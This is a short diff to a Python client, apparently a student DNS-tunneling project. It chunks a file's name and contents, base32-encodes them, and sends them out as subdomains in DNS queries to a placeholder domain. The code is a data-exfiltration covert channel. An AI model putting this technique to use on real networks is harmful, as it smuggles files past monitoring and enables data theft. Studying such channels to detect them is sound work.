@@ -51,12 +51,13 @@ class Client:
         pkts.append(self.file_name + f" #FILENAME#")
         for i in range(0, self.message.__len__(), self.record_len):
             pkts.append(self.message[i:min(i + self.record_len, self.message.__len__())] + f" #index {i}#")
+        pkts[0]+=f" size={len(pkts)}"
         return pkts
 
     def send_messages(self):
         for i, pkt in enumerate(self.pkts):
             msg = self.encode_to_base32(pkt)
-            answers = dns.resolver.query(f'www.{msg}jct.ac.il', 'A')
+            answers = dns.resolver.query(f'{msg}legit-domain.demo', 'A')
 
     @staticmethod
     def check_params(path, label_len, record_len):
